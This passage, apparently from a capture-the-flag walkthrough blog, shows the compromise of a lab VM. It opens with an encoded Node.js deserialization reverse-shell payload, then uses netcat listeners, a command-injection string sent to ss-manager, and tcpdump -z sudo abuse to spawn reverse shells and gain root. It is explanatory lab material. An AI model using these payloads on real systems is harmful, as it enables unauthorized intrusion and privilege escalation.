sMTE2LDEyMSwxMTIsMTAxLDQ2LDk5LDExMSwxMTAsMTE2LDk3LDEwNSwxMTAsMTE1LDMyLDYxLDYxLDYxLDMyLDM5LDExNywxMTAsMTAwLDEwMSwxMDIsMTA1LDExMCwxMDEsMTAwLDM5LDQxLDMyLDEyMywzMiw4MywxMTYsMTE0LDEwNSwxMTAsMTAzLDQ2LDExMiwxMTQsMTExLDExNiwxMTEsMTE2LDEyMSwxMTIsMTAxLDQ2LDk5LDExMSwxMTAsMTE2LDk3LDEwNSwxMTAsMTE1LDMyLDYxLDMyLDEwMiwxMTcsMTEwLDk5LDExNiwxMDUsMTExLDExMCw0MCwxMDUsMTE2LDQxLDMyLDEyMywzMiwxMTQsMTAxLDExNiwxMTcsMTE0LDExMCwzMiwxMTYsMTA0LDEwNSwxMTUsNDYsMTA1LDExMCwxMDAsMTAxLDEyMCw3OSwxMDIsNDAsMTA1LDExNiw0MSwzMiwzMyw2MSwzMiw0NSw0OSw1OSwzMiwxMjUsNTksMzIsMTI1LDEwLDEwMiwxMTcsMTEwLDk5LDExNiwxMDUsMTExLDExMCwzMiw5OSw0MCw3Miw3OSw4Myw4NCw0NCw4MCw3OSw4Miw4NCw0MSwzMiwxMjMsMTAsMzIsMzIsMzIsMzIsMTE4LDk3LDExNCwzMiw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDMyLDYxLDMyLDExMCwxMDEsMTE5LDMyLDExMCwxMDEsMTE2LDQ2LDgzLDExMSw5OSwxMDcsMTAxLDExNiw0MCw0MSw1OSwxMCwzMiwzMiwzMiwzMiw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDQ2LDk5LDExMSwxMTAsMTEwLDEwMSw5OSwxMTYsNDAsODAsNzksODIsODQsNDQsMzIsNzIsNzksODMsODQsNDQsMzIsMTAyLDExNywxMTAsOTksMTE2LDEwNSwxMTEsMTEwLDQwLDQxLDMyLDEyMywxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwxMTgsOTcsMTE0LDMyLDExNSwxMDQsMzIsNjEsMzIsMTE1LDExMiw5NywxMTksMTEwLDQwLDM5LDQ3LDk4LDEwNSwxMTAsNDcsMTE1LDEwNCwzOSw0NCw5MSw5Myw0MSw1OSwxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDQ2LDExOSwxMTQsMTA1LDExNiwxMDEsNDAsMzQsNjcsMTExLDExMCwxMTAsMTAxLDk5LDExNiwxMDEsMTAwLDMzLDkyLDExMCwzNCw0MSw1OSwxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDQ2LDExMiwxMDUsMTEyLDEwMSw0MCwxMTUsMTA0LDQ2LDExNSwxMTYsMTAwLDEwNSwxMTAsNDEsNTksMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMTE1LDEwNCw0NiwxMTUsMTE2LDEwMCwxMTEsMTE3LDExNiw0NiwxMTIsMTA1LDExMiwxMDEsNDAsOTksMTA4LDEwNSwxMDEsMTEwLDExNiw0MSw1OSwxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwxMTUsMTA0LDQ2LDExNSwxMTYsMTAwLDEwMSwxMTQsMTE0LDQ2LDExMiwxMDUsMTEyLDEwMSw0MCw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDQxLDU5LDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDExNSwxMDQsNDYsMTExLDExMCw0MCwzOSwxMDEsMTIwLDEwNSwxMTYsMzksNDQsMTAyLDExNywxMTAsOTksMTE2LDEwNSwxMTEsMTEwLDQwLDk5LDExMSwxMDAsMTAxLDQ0LDExNSwxMDUsMTAzLDExMCw5NywxMDgsNDEsMTIzLDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDk5LDEwOCwxMDUsMTAxLDExMCwxMTYsNDYsMTAxLDExMCwxMDAsNDAsMzQsNjgsMTA1LDExNSw5OSwxMTEsMTEwLDExMCwxMDEsOTksMTE2LDEwMSwxMDAsMzMsOTIsMTEwLDM0LDQxLDU5LDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDEyNSw0MSw1OSwxMCwzMiwzMiwzMiwzMiwxMjUsNDEsNTksMTAsMzIsMzIsMzIsMzIsOTksMTA4LDEwNSwxMDEsMTEwLDExNiw0NiwxMTEsMTEwLDQwLDM5LDEwMSwxMTQsMTE0LDExMSwxMTQsMzksNDQsMzIsMTAyLDExNywxMTAsOTksMTE2LDEwNSwxMTEsMTEwLDQwLDEwMSw0MSwzMiwxMjMsMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMTE1LDEwMSwxMTYsODQsMTA1LDEwOSwxMDEsMTExLDExNywxMTYsNDAsOTksNDAsNzIsNzksODMsODQsNDQsODAsNzksODIsODQsNDEsNDQsMzIsODQsNzMsNzcsNjksNzksODUsODQsNDEsNTksMTAsMzIsMzIsMzIsMzIsMTI1LDQxLDU5LDEwLDEyNSwxMCw5OSw0MCw3Miw3OSw4Myw4NCw0NCw4MCw3OSw4Miw4NCw0MSw1OSwxMCkpfSgpIn0=
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0

HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 11
ETag: W/&quot;b-GWZKb4joaEb2aqpBlbdbhMNzgtI&quot;
Date: Wed, 11 Jul 2018 15:27:37 GMT
Connection: close

Hello Admin&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;We heave the connection. Great!&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# nc &lt;span class=&quot;nt&quot;&gt;-lvp&lt;/span&gt; 1337
listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 1337 ...
10.0.0.5: inverse host lookup failed: Unknown host
connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.0.0.4] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.0.0.5] 56006
Connected!
&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
total 40
drwx------. 5 nodeadmin nodeadmin 4096 Jun  7 23:05 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x. 4 root      root      4096 Jun  2 23:02 ..
&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 1 nodeadmin nodeadmin    1 Jun  7 23:04 .bash_history
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 1 nodeadmin nodeadmin   18 Mar 15 09:56 .bash_logout
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 1 nodeadmin nodeadmin  193 Mar 15 09:56 .bash_profile
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 1 nodeadmin nodeadmin  231 Mar 15 09:56 .bashrc
drwx------  3 nodeadmin nodeadmin 4096 Jun  1 13:24 .config
&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt;  1 nodeadmin nodeadmin   16 Jun  3 16:41 .esd_auth
drwxr-xr-x  4 nodeadmin nodeadmin 4096 Jun  3 00:58 .forever
drwxrwxr-x. 3 nodeadmin nodeadmin 4096 May 30 17:44 .web
&lt;span class=&quot;nb&quot;&gt;id 
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1001&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nodeadmin&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1001&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nodeadmin&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1001&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nodeadmin&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
which python
/usr/bin/python
python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'import pty; pty.spawn(&quot;/bin/sh&quot;)'&lt;/span&gt; 
sh-4.4&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;/bin/bash
/bin/bash
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;nodeadmin@localhost .forever]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;uname&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;uname&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt;
Linux localhost.localdomain 4.16.3-301.fc28.x86_64 &lt;span class=&quot;c&quot;&gt;#1 SMP Mon Apr 23 21:59:58 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Now we’re ready to escalate. Firstly I decided to check out &lt;code class=&quot;highlighter-rouge&quot;&gt;crontab&lt;/code&gt;. Nothing interesting there.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;nodeadmin@localhost ~]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;crontab &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
crontab &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
@reboot /bin/node /home/nodeadmin/.web/server.js &amp;amp;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;But in &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt; I notice that there is another user.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;nodeadmin@localhost ~]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/passwd
&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/passwd
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
&lt;span class=&quot;nb&quot;&gt;sync&lt;/span&gt;:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:65534:65534:Kernel Overflow User:/:/sbin/nologin
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
systemd-coredump:x:999:996:systemd Core Dumper:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
systemd-resolve:x:193:193:systemd Resolver:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:998:995:User &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;polkitd:/:/sbin/nologin
geoclue:x:997:993:User &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;geoclue:/var/lib/geoclue:/sbin/nologin
colord:x:996:992:User &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;colord:/var/lib/colord:/sbin/nologin
rtkit:x:172:172:RealtimeKit:/proc:/sbin/nologin
pulse:x:171:171:PulseAudio System Daemon:/var/run/pulse:/sbin/nologin
gluster:x:995:989:GlusterFS daemons:/run/gluster:/sbin/nologin
qemu:x:107:107:qemu user:/:/sbin/nologin
avahi:x:70:70:Avahi mDNS/DNS-SD Stack:/var/run/avahi-daemon:/sbin/nologin
chrony:x:994:988::/var/lib/chrony:/sbin/nologin
dnsmasq:x:987:987:Dnsmasq DHCP and DNS server:/var/lib/dnsmasq:/sbin/nologin
rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
usbmuxd:x:113:113:usbmuxd user:/:/sbin/nologin
openvpn:x:986:986:OpenVPN:/etc/openvpn:/sbin/nologin
radvd:x:75:75:radvd user:/:/sbin/nologin
saslauth:x:985:76:Saslauthd user:/run/saslauthd:/sbin/nologin
nm-openvpn:x:984:983:Default user &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;running openvpn spawned by NetworkManager:/:/sbin/nologin
nm-openconnect:x:983:982:NetworkManager user &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;OpenConnect:/:/sbin/nologin
abrt:x:173:173::/etc/abrt:/sbin/nologin
pipewire:x:982:980:PipeWire System Daemon:/var/run/pipewire:/sbin/nologin
gdm:x:42:42::/var/lib/gdm:/sbin/nologin
rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
gnome-initial-setup:x:981:979::/run/gnome-initial-setup/:/sbin/nologin
vboxadd:x:980:1::/var/run/vboxadd:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin
tcpdump:x:72:72::/:/sbin/nologin
nginx:x:979:977:Nginx web server:/var/lib/nginx:/sbin/nologin
mysql:x:27:27:MySQL Server:/var/lib/mysql:/sbin/nologin
squid:x:23:23::/var/spool/squid:/sbin/nologin
webalizer:x:67:976:Webalizer:/var/www/usage:/sbin/nologin
nodeadmin:x:1001:1001::/home/nodeadmin:/bin/bash
fireman:x:1002:1002::/home/fireman:/bin/bash&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;I decided to check whether or not we can escalate to him, looking at different files, etc. However, while viewing running processes, I’ve noticed something strange.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;nodeadmin@localhost ~]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ps &lt;span class=&quot;nt&quot;&gt;-aux&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;fireman
ps &lt;span class=&quot;nt&quot;&gt;-aux&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;fireman
root       832  0.0  0.4 301464  4556 ?        S    04:39   0:00 su fireman &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; /usr/local/bin/ss-manager
fireman    855  0.0  0.3  37060  3812 ?        Ss   04:39   0:00 /usr/local/bin/ss-manager
nodeadm+   954  0.0  0.0 213788   968 pts/0    S+   04:43   0:00 &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--color&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;auto fireman&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;We can see that &lt;code class=&quot;highlighter-rouge&quot;&gt;fireman&lt;/code&gt; is running &lt;code class=&quot;highlighter-rouge&quot;&gt;ss-manager&lt;/code&gt; as root. Googling for this service shows me this awesome exploit technique. Read more &lt;a href=&quot;https://www.exploit-db.com/exploits/43006/&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Following snippet will execute a &lt;code class=&quot;highlighter-rouge&quot;&gt;nc&lt;/code&gt; reverse shell to our Kali machine.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;nodeadmin@localhost ~]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; 127.0.0.1 8839
nc &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; 127.0.0.1 8839
add: &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;server_port&quot;&lt;/span&gt;:8003, &lt;span class=&quot;s2&quot;&gt;&quot;password&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;test&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;method&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;|| nc -e /bin/sh 10.0.0.4 4444 ||&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
ok&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Now to our listener.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# nc &lt;span class=&quot;nt&quot;&gt;-lvp&lt;/span&gt; 4444
listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 4444 ...
10.0.0.5: inverse host lookup failed: Unknown host
connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.0.0.4] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.0.0.5] 51256
python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'import pty;pty.spawn(&quot;/bin/bash&quot;)'&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;fireman@localhost root]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;: cannot open directory &lt;span class=&quot;s1&quot;&gt;'.'&lt;/span&gt;: Permission denied
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;fireman@localhost root]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /home/fireman
&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /home/fireman
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;fireman@localhost ~]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
total 44
drwx------  6 fireman fireman 4096 Jun  7 23:10 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x. 4 root    root    4096 Jun  2 23:02 ..
&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt;  1 fireman fireman 2151 Jun  7 22:33 .bash_history
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 fireman fireman   18 Mar 15 09:56 .bash_logout
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 fireman fireman  193 Mar 15 09:56 .bash_profile
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 fireman fireman  231 Mar 15 09:56 .bashrc
drwx------  3 fireman fireman 4096 Jun  3 01:12 .config
&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt;  1 fireman fireman   16 Jun  3 01:12 .esd_auth
drwxr-xr-x  4 fireman fireman 4096 Apr 25 02:33 .mozilla
drwxrwxr-x  2 fireman fireman 4096 Jun  3 01:55 .shadowsocks
drwx------  2 fireman fireman 4096 Jun  2 22:39 .ssh&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Now as a part of my regular privilage escalation enumeration, using &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo -l&lt;/code&gt; I’ve found these 3 commands that we can run as a root.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;fireman@localhost ~]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
Matching Defaults entries &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;fireman on localhost:
    &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;visiblepw, env_reset, &lt;span class=&quot;nv&quot;&gt;env_keep&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR
    LS_COLORS&quot;&lt;/span&gt;, env_keep+&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS
    LC_CTYPE&quot;&lt;/span&gt;, env_keep+&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT
    LC_MESSAGES&quot;&lt;/span&gt;, env_keep+&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER
    LC_TELEPHONE&quot;&lt;/span&gt;, env_keep+&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
    XAUTHORITY&quot;&lt;/span&gt;,
    &lt;span class=&quot;nv&quot;&gt;secure_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/local/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/local/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/bin

User fireman may run the following commands on localhost:
    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ALL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /sbin/iptables
    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ALL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /usr/bin/nmcli
    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ALL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /usr/sbin/tcpdump&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;After doing a bit of research I came across this &lt;a href=&quot;http://seclists.org/tcpdump/2010/q3/68&quot;&gt;article&lt;/a&gt;, showing us how we can execute a command using a &lt;code class=&quot;highlighter-rouge&quot;&gt;tcpdump&lt;/code&gt; tool. Firstly, I add only simple &lt;code class=&quot;highlighter-rouge&quot;&gt;id&lt;/code&gt; command in order to check whether or not will this technique work.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;fireman@localhost ~]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;touch&lt;/span&gt; /tmp/exploit
&lt;span class=&quot;nb&quot;&gt;touch&lt;/span&gt; /tmp/exploit
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;fireman@localhost ~]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +x /tmp/exploit
&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +x /tmp/exploit
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;fireman@localhost ~]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;id&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /tmp/exploit
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;id&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /tmp/exploit&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Now We can execute it and see the results.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;fireman@localhost ~]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;tcpdump &lt;span class=&quot;nt&quot;&gt;-ln&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /dev/null &lt;span class=&quot;nt&quot;&gt;-W&lt;/span&gt; 1 &lt;span class=&quot;nt&quot;&gt;-G&lt;/span&gt; 1 &lt;span class=&quot;nt&quot;&gt;-z&lt;/span&gt; /tmp/exploit &lt;span class=&quot;nt&quot;&gt;-Z&lt;/span&gt; root
&amp;lt;eth0 &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /dev/null &lt;span class=&quot;nt&quot;&gt;-W&lt;/span&gt; 1 &lt;span class=&quot;nt&quot;&gt;-G&lt;/span&gt; 1 &lt;span class=&quot;nt&quot;&gt;-z&lt;/span&gt; /tmp/exploit &lt;span class=&quot;nt&quot;&gt;-Z&lt;/span&gt; root
tcpdump: listening on eth0, link-type EN10MB &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ethernet&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, capture size 262144 bytes
Maximum file limit reached: 1
1 packet captured
10 packets received by filter
0 packets dropped by kernel
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;fireman@localhost ~]&lt;span class=&quot;nv&quot;&gt;$ uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Now we can use it to make another reverse shell (simply calling &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/bash&lt;/code&gt; didn’t work).&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;fireman@localhost ~]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;nc -e /bin/bash 10.0.0.4 6666&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /tmp/exploit
